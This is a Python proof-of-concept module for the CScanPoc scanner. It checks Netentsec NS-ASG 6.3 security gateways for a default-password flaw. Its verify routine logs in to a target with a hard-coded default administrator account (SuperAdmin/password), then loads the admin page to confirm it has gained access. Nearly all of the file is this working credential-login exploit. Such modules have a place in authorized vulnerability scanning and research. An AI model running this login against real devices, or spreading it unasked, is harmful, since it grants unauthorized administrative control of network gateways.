# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'Netentsec_0025'  # 平台漏洞编号，留空
    name = '网康NS-ASG 默认口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-10-08'  # 漏洞公布时间
    desc = '''
        网康安全网关NS—ASG 6.3默认账户密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = '网康NS-ASG 6.3'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '304171af-81c2-4f8e-9d5c-7bef5198fb27'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer     :  http://www.wooyun.org/bugs/wooyun-2014-078677
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/logon/logon.php?username=SuperAdmin&password=password&sl_p1_1encrypt=1&action=logon&goto=1'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if 'location.href = "/admin/index"' in res:
                admin = arg + '/admin/index'
                code, head, res, errcode, _ = hh.http(admin)

                if code==200 and 'name="main" src="device_status.php"' in res:
                    #security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
